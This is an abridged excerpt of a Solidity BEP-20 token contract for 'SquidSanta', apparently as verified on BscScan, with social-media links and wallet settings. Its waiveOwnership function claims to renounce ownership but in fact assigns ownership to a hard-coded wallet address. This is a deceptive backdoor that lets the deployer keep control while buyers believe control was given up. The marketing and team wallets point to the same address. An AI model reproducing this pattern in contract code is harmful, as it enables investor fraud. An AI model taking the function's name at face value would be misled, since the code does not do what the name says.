...
/**
 *Submitted for verification at BscScan.com on 2022-11-8
*/

/**
TELEGRAM : https://t.me/squidsanta
Website : http://squidsanta.online/
Twitter : https://twitter.com/squidsanta_bsc
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x25d6970c65A3Ca64E73e95206fcCEac84Cd1901d);
    }
...
contract SquidSanta is Context, IERC20, Ownable {
    ...
    string private _symbol = "$S Santa";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x14607fAfaf63d3992Ef4cB4E28df7B74A21C46a8);
    address payable public teamWalletAddress = payable(0x14607fAfaf63d3992Ef4cB4E28df7B74A21C46a8);
